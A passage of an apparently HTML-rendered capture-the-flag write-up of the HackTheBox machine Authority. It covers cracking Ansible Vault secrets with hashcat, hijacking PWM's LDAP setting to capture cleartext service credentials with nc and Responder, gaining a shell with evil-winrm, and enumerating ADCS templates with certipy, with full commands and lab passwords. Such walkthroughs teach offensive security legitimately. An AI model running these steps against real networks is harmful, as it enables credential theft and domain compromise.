+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       32l       55w      703c http://authority.htb/
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://authority.htb/error%1F_log
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m     30000/30000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:2       </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30000/30000   438/s   http://authority.htb/ 
+</span></code></pre></div></div>
+<p>Absolutely nothing.</p>
+<h3 id="pwm---tcp-8443">PWM - TCP 8443</h3>
+<h4 id="certificate">Certificate</h4>
+<p>The TLS certificate is not useful:</p>
+<picture>
+<source srcset="/img/image-20231123163312293.webp" type="image/webp"/>
+<img alt="image-20231123163312293" class="include_image" loading="lazy" src="/img/image-20231123163312293.png"/>
+</picture>
+<h4 id="site-1">Site</h4>
+<p>The web root redirects to <code class="language-plaintext highlighter-rouge">/pwm/</code>, presents an instance of <a href="https://github.com/pwm-project/pwm">PWM</a>:</p>
+<picture>
+<source srcset="/img/image-20231123164727269.webp" type="image/webp"/>
+<img alt="image-20231123164727269" class="include_image" loading="lazy" src="/img/image-20231123164727269.png"/>
+</picture>
+<p>PWM is:</p>
+<blockquote>
+<p>an open source password self-service application for LDAP directories.</p>
+</blockquote>
+<p>Clicking on the down arrow at the top right gives more information:</p>
+<picture>
+<source srcset="/img/image-20231127125440973.webp" type="image/webp"/>
+<img alt="image-20231127125440973" class="include_image" loading="lazy" src="/img/image-20231127125440973.png"/>
+</picture>
+<p>“open configuration mode” must be why those two additional button are below the “Sign in” button. Clicking on any of them loads another screen asking for a password:</p>
+<picture>
+<source srcset="/img/image-20231127125640132.webp" type="image/webp"/>
+<img alt="image-20231127125640132" class="include_image" loading="lazy" src="/img/image-20231127125640132.png"/>
+</picture>
+<h2 id="shell-as-svc_ldap">Shell as svc_ldap</h2>
+<h3 id="ansible-files">Ansible Files</h3>
+<h4 id="download">Download</h4>
+<p>One of the directories in the SMB share was named <code class="language-plaintext highlighter-rouge">PWM</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">smb: \Automation\Ansible\PWM\&gt; </span><span class="nb">ls</span>
+<span class="go">  .                                   D        0  Fri Mar 17 09:20:48 2023
+  ..                                  D        0  Fri Mar 17 09:20:48 2023
+  ansible.cfg                         A      491  Thu Sep 22 01:36:58 2022
+  ansible_inventory                   A      174  Wed Sep 21 18:19:32 2022
+  defaults                            D        0  Fri Mar 17 09:20:48 2023
+  handlers                            D        0  Fri Mar 17 09:20:48 2023
+  meta                                D        0  Fri Mar 17 09:20:48 2023
+  README.md                           A     1290  Thu Sep 22 01:35:58 2022
+  tasks                               D        0  Fri Mar 17 09:20:48 2023
+  templates                           D        0  Fri Mar 17 09:20:48 2023
+
+                5888511 blocks of size 4096. 1145489 blocks available
+</span></code></pre></div></div>
+<p>I’ll download the files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">smb: \Automation\Ansible\&gt; </span>prompt off
+<span class="gp">smb: \Automation\Ansible\&gt; </span>recurse <span class="nb">true</span>
+<span class="gp">smb: \Automation\Ansible\&gt; </span>mget PWM
+<span class="go">getting file \Automation\Ansible\PWM\ansible.cfg of size 491 as PWM/ansible.cfg (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+getting file \Automation\Ansible\PWM\ansible_inventory of size 174 as PWM/ansible_inventory (0.1 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+getting file \Automation\Ansible\PWM\README.md of size 1290 as PWM/README.md (1.0 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as PWM/defaults/main.yml (1.6 KiloBytes/sec) (average 0.8 KiloBytes/sec)
+getting file \Automation\Ansible\PWM\handlers\main.yml of size 4 as PWM/handlers/main.yml (0.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+getting file \Automation\Ansible\PWM\meta\main.yml of size 199 as PWM/meta/main.yml (0.2 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+getting file \Automation\Ansible\PWM\tasks\main.yml of size 1832 as PWM/tasks/main.yml (1.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
+getting file \Automation\Ansible\PWM\templates\context.xml.j2 of size 422 as PWM/templates/context.xml.j2 (0.4 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+getting file \Automation\Ansible\PWM\templates\tomcat-users.xml.j2 of size 388 as PWM/templates/tomcat-users.xml.j2 (0.5 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+</span></code></pre></div></div>
+<h4 id="files">Files</h4>
+<p>The <code class="language-plaintext highlighter-rouge">ansible_inventory</code> file has what looks like some credentials for WinRM:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">ansible_user</span><span class="pi">:</span> <span class="s">administrator</span>
+<span class="na">ansible_password</span><span class="pi">:</span> <span class="s">Welcome1</span>
+<span class="na">ansible_port</span><span class="pi">:</span> <span class="m">5985</span>
+<span class="na">ansible_connection</span><span class="pi">:</span> <span class="s">winrm</span>
+<span class="na">ansible_winrm_transport</span><span class="pi">:</span> <span class="s">ntlm</span>
+<span class="na">ansible_winrm_server_cert_validation</span><span class="pi">:</span> <span class="s">ignore</span>
+</code></pre></div></div>
+<p>I’ll try those with <code class="language-plaintext highlighter-rouge">netexec</code>, but they don’t work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm authority.htb <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'Welcome1'</span>
+<span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.222    5985   AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.222    5985   AUTHORITY        </span><span class="netexec-logfail">[-]</span><span class="go"> authority.htb\administrator:Welcome1
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">defaults/main.yml</code> has configuration values for PWM:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">pwm_run_dir</span><span class="pi">:</span> <span class="s2">"</span><span class="s">{{</span><span class="nv"> </span><span class="s">lookup('env',</span><span class="nv"> </span><span class="s">'PWD')</span><span class="nv"> </span><span class="s">}}"</span>
+
+<span class="na">pwm_hostname</span><span class="pi">:</span> <span class="s">authority.htb.corp</span>
+<span class="na">pwm_http_port</span><span class="pi">:</span> <span class="s2">"</span><span class="s">{{</span><span class="nv"> </span><span class="s">http_port</span><span class="nv"> </span><span class="s">}}"</span>
+<span class="na">pwm_https_port</span><span class="pi">:</span> <span class="s2">"</span><span class="s">{{</span><span class="nv"> </span><span class="s">https_port</span><span class="nv"> </span><span class="s">}}"</span>
+<span class="na">pwm_https_enable</span><span class="pi">:</span> <span class="kc">true</span>
+
+<span class="na">pwm_require_ssl</span><span class="pi">:</span> <span class="kc">false</span>
+
+<span class="na">pwm_admin_login</span><span class="pi">:</span> <span class="kt">!vault</span> <span class="pi">|</span>
+          <span class="s">$ANSIBLE_VAULT;1.1;AES256</span>
+          <span class="s">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span>
+          <span class="s">6134353663663462373265633832356663356239383039640a346431373431666433343434366139</span>
+          <span class="s">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span>
+          <span class="s">6334326263326364380a653034313733326639323433626130343834663538326439636232306531</span>
+          <span class="s">3438</span>
+
+<span class="na">pwm_admin_password</span><span class="pi">:</span> <span class="kt">!vault</span> <span class="pi">|</span>
+          <span class="s">$ANSIBLE_VAULT;1.1;AES256</span>
+          <span class="s">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span>
+          <span class="s">3335616263326464633832376261306131303337653964350a363663623132353136346631396662</span>
+          <span class="s">38656432323830393339336231373637303535613636646561653637386634613862316638353530</span>
+          <span class="s">3930356637306461350a316466663037303037653761323565343338653934646533663365363035</span>
+          <span class="s">6531</span>
+
+<span class="na">ldap_uri</span><span class="pi">:</span> <span class="s">ldap://127.0.0.1/</span>
+<span class="na">ldap_base_dn</span><span class="pi">:</span> <span class="s2">"</span><span class="s">DC=authority,DC=htb"</span>
+<span class="na">ldap_admin_password</span><span class="pi">:</span> <span class="kt">!vault</span> <span class="pi">|</span>
+          <span class="s">$ANSIBLE_VAULT;1.1;AES256</span>
+          <span class="s">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span>
+          <span class="s">3437333035366235613437373733316635313530326639330a643034623530623439616136363563</span>
+          <span class="s">34646237336164356438383034623462323531316333623135383134656263663266653938333334</span>
+          <span class="s">3238343230333633350a646664396565633037333431626163306531336336326665316430613566</span>
+          <span class="s">3764</span>
+</code></pre></div></div>
+<h3 id="recover-passwords">Recover Passwords</h3>
+<h4 id="format-hashes">Format Hashes</h4>
+<p>The values in the file above are protected with <a href="https://docs.ansible.com/ansible/2.8/user_guide/vault.html#variable-level-encryption">Ansible Vault</a>. The Jumbo John The Ripper repo has a <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/ansible2john.py">script</a>, <code class="language-plaintext highlighter-rouge">ansible2john.py</code>. The script takes in a file with two lines, the first being the header and the second being the hex-encoded values above. I’ll format the three protected values into files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span><span class="nb">ls</span> <span class="k">*</span>_vault
+<span class="go">ldap_admin_password_vault  pwm_admin_login_vault  pwm_admin_password_vault
+</span><span class="gp">oxdf@hacky$ </span><span class="nb">cat </span>ldap_admin_password_vault 
+<span class="go">$ANSIBLE_VAULT;1.1;AES256
+633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
+</span><span class="gp">oxdf@hacky$ </span><span class="nb">cat </span>pwm_admin_login_vault 
+<span class="go">$ANSIBLE_VAULT;1.1;AES256
+326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
+</span><span class="gp">oxdf@hacky$ </span><span class="nb">cat </span>pwm_admin_password_vault 
+<span class="go">$ANSIBLE_VAULT;1.1;AES256
+313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
+</span></code></pre></div></div>
+<p>Now I can run <code class="language-plaintext highlighter-rouge">ansible2john.py</code> to make hashes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>python ansible2john.py ldap_admin_password_vault pwm_admin_login_vault pwm_admin_password_vault | <span class="nb">tee </span>vault_hashes
+<span class="go">ldap_admin_password_vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
+pwm_admin_login_vault:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
+pwm_admin_password_vault:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
+</span></code></pre></div></div>
+<h4 id="crack-hashes">Crack Hashes</h4>
+<p><code class="language-plaintext highlighter-rouge">hashcat</code> can handle these:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat vault_hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nt">--user</span>
+<span class="go">hashcat (v6.2.6) starting in autodetect mode
+...[snip]...
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+16900 | Ansible Vault | Password Manager
+...[snip]...
+$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&amp;*
+$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&amp;*
+$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&amp;*
+...[snip]...
+</span></code></pre></div></div>
+<p>They all have the same password, <code class="language-plaintext highlighter-rouge">!@#$%^&amp;*</code>, which makes sense since they are encrypted in the same ansible file.</p>
+<h4 id="decrypt">Decrypt</h4>
+<p><code class="language-plaintext highlighter-rouge">pipx install ansible-core</code> installs a bunch of ansible tools, including <code class="language-plaintext highlighter-rouge">ansible-vault</code>, which can decrypt the blobs with passwords:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ldap_admin_password_vault | ansible-vault decrypt
+<span class="go">Vault password: 
+Decryption successful
+DevT3st@123
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>pwm_admin_login_vault | ansible-vault decrypt
+<span class="go">Vault password: 
+Decryption successful
+svc_pwm
+</span><span class="gp">oxdf@hacky$</span><span class="w"> 
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>pwm_admin_password_vault | ansible-vault decrypt
+<span class="go">Vault password: 
+Decryption successful
+pWm_@dm!N_!23
+</span></code></pre></div></div>
+<h3 id="machine-access-fail">Machine Access [Fail]</h3>
+<p>I’ll try this password combination with <code class="language-plaintext highlighter-rouge">netexec</code>. On SMB, it seems to work, but then it can’t access any shares:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb authority.htb <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logsuccess">[+]</span><span class="go"> authority.htb\svc_pwm:pWm_@dm!N_!23 
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb authority.htb <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span> <span class="nt">--shares</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logsuccess">[+]</span><span class="go"> authority.htb\svc_pwm:pWm_@dm!N_!23 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logfail">[-]</span><span class="go"> Error enumerating shares: STATUS_ACCESS_DENIED
+</span></code></pre></div></div>
+<p>It can’t access WinRM and fails to access LDAP for some reason:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm authority.htb <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
+<span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.222    5985   AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.222    5985   AUTHORITY        </span><span class="netexec-logfail">[-]</span><span class="go"> authority.htb\svc_pwm:pWm_@dm!N_!23
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ldap 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">LDAP </span><span class="go">       10.10.11.222    445    AUTHORITY        </span><span class="netexec-logfail">[-]</span><span class="go"> authority.htb\svc_pwm:pWm_@dm!N_!23 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno Connection error (authority.authority.htb:389)] [Errno -2] Name or service not known
+</span></code></pre></div></div>
+<p>Not accessing LDAP seems like a problem for PWM.</p>
+<h3 id="pwm-access">PWM Access</h3>
+<h4 id="login-fail">Login Fail</h4>
+<p>On the PWM login screen, I’ll enter the credentials and hit “Sign in”:</p>
+<picture>
+<source srcset="/img/image-20231127125337887.webp" type="image/webp"/>
+<img alt="image-20231127125337887" class="include_image" loading="lazy" src="/img/image-20231127125337887.png"/>
+</picture>
+<p>The result is this popup:</p>
+<picture>
+<source srcset="/img/image-20231127125309961.webp" type="image/webp"/>
+<img alt="image-20231127125309961" class="include_image" loading="lazy" src="/img/image-20231127125309961.png"/>
+</picture>
+<p>This looks similar to what I was getting with <code class="language-plaintext highlighter-rouge">netexec</code>.</p>
+<h4 id="configuration-manager">Configuration Manager</h4>
+<p>The password <code class="language-plaintext highlighter-rouge">pWm_@dm!N_!23</code> works to log into the configuration manager:</p>
+<picture>
+<source srcset="/img/image-20231127125848531.webp" type="image/webp"/>
+<img alt="image-20231127125848531" class="include_image" loading="lazy" src="/img/image-20231127125848531.png"/>
+</picture>
+<p>PWM is running out of <code class="language-plaintext highlighter-rouge">C:\pwm</code>.</p>
+<h4 id="configuration-editor">Configuration Editor</h4>
+<p>It also works to get into the Configuration Editor:</p>
+<picture>
+<source srcset="/img/image-20231127130156435.webp" type="image/webp"/>
+<img alt="image-20231127130156435" class="include_image" loading="lazy" src="/img/image-20231127130156435.png"/>
+</picture>
+<p>There are tons of options here I can mess with. In the LDAP connection config, I get the same hostname, <code class="language-plaintext highlighter-rouge">authority.authority.htb</code>, as well as the svc_ldap username:</p>
+<picture>
+<source srcset="/img/image-20231127130405797.webp" type="image/webp"/>
+<img alt="image-20231127130405797" class="include_image" loading="lazy" src="/img/image-20231127130405797.png"/>
+</picture>
+<p>The creds used are stored, but not retrievable through the web GUI:</p>
+<picture>
+<source srcset="/img/image-20231127130505380.webp" type="image/webp"/>
+<img alt="image-20231127130505380" class="include_image" loading="lazy" src="/img/image-20231127130505380.png"/>
+</picture>
+<h3 id="capture-ldap-creds">Capture LDAP Creds</h3>
+<p>There are some cached credentials stored. To recover them, I’ll edit the URL to point at me, using cleartext LDAP rather than LDAPS (and using the default LDAP port 389):</p>
+<picture>
+<source srcset="/img/image-20231127130706990.webp" type="image/webp"/>
+<img alt="image-20231127130706990" class="include_image" loading="lazy" src="/img/image-20231127130706990.png"/>
+</picture>
+<p>I’ll listen with <code class="language-plaintext highlighter-rouge">nc</code> on 389 and click “Test LDAP Profile”:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 389
+<span class="go">Listening on 0.0.0.0 389
+Connection received on 10.10.11.222 61956
+0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htblDaP_1n_th3_cle4r!
+</span></code></pre></div></div>
+<p>The password is “lDaP_1n_th3_cle4r!”, though it’s not trivial to see in that capture, as there are non-ASCII characters in this data that the terminal just drops. It’s easier to see in Wireshark:</p>
+<picture>
+<source srcset="/img/image-20231127131357051.webp" type="image/webp"/>
+<img alt="image-20231127131357051" class="include_image" loading="lazy" src="/img/image-20231127131357051.png"/>
+</picture>
+<p>Authority is acting as the client trying to authenticate to my VM, and sends these creds in the clear. <a href="https://github.com/lgandx/Responder">Responder</a> will also listen for and capture these creds:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">[+] Listening for events...
+
+[LDAP] Cleartext Client   : 10.10.11.222
+[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
+</span></code></pre></div></div>
+<h3 id="winrm">WinRM</h3>
+<p>Those creds work with the svc_ldap account over both SMB and WinRM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb authority.htb <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logsuccess">[+]</span><span class="go"> authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm authority.htb <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    5985   AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
+</span><span class="netexec-protocol">HTTP </span><span class="go">       10.10.11.222    5985   AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> http://10.10.11.222:5985/wsman
+</span><span class="netexec-protocol">HTTP </span><span class="go">       10.10.11.222    5985   AUTHORITY        </span><span class="netexec-logsuccess">[+]</span><span class="go"> authority.htb\svc_ldap:lDaP_1n_th3_cle4r! </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go">
+</span></code></pre></div></div>
+<p>I’ll go directly to WinRM and get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> authority.htb <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
+<span class="go">
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>And the user flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\svc_ldap\desktop&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+</span><span class="go">31d4b9bf************************
+</span></code></pre></div></div>
+<h2 id="shell-as-administrator">Shell as administrator</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="filesystem">Filesystem</h4>
+<p>The filesystem is quite bare. There no other user directory on the box other than <code class="language-plaintext highlighter-rouge">Public</code> (which is empty) and <code class="language-plaintext highlighter-rouge">Admistrator</code> (which is where I want to get):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\users&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/17/2023   9:31 AM                Administrator
+d-r---         8/9/2022   4:35 PM                Public
+d-----        3/24/2023  11:27 PM                svc_ldap
+</span></code></pre></div></div>
+<p>The IIS folders are empty, and I don’t see much of interest in the PWM configs.</p>
+<h4 id="adcs">ADCS</h4>
+<p>It’s always worth enumerating ADCS on a Windows DC. I’ve shown <code class="language-plaintext highlighter-rouge">certipy</code> (<code class="language-plaintext highlighter-rouge">pipx install certipy-ad</code>, <a href="https://github.com/ly4k/Certipy">GitHub</a>) before on <a href="/2023/05/27/htb-absolute.html#shadow-credential">Absolute</a> and <a href="/2023/06/17/htb-escape.html#shell-as-administrator">Escape</a>. I’ll use the <code class="language-plaintext highlighter-rouge">find</code> command to identify templates, and with <code class="language-plaintext highlighter-rouge">-vulnerable</code> only show vulnerable ones:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy find <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-target</span> authority.htb <span class="nt">-text</span> <span class="nt">-stdout</span> <span class="nt">-vulnerable</span>
+<span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 37 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'AUTHORITY-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : AUTHORITY-CA
+    DNS Name                            : authority.authority.htb
+    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
+    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
+    Certificate Validity End            : 2123-04-24 01:56:25+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : AUTHORITY.HTB\Administrators
+      Access Rights
+        ManageCertificates              : AUTHORITY.HTB\Administrators
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+        ManageCa                        : AUTHORITY.HTB\Administrators
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+        Enroll                          : AUTHORITY.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : CorpVPN
+    Display Name                        : Corp VPN
+    Certificate Authorities             : AUTHORITY-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
+                                          PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+                                          Document Signing
+                                          IP security IKE intermediate
+                                          IP security use
+                                          KDC Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 20 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : AUTHORITY.HTB\Administrator
+        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+                                          AUTHORITY.HTB\Administrator
+        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
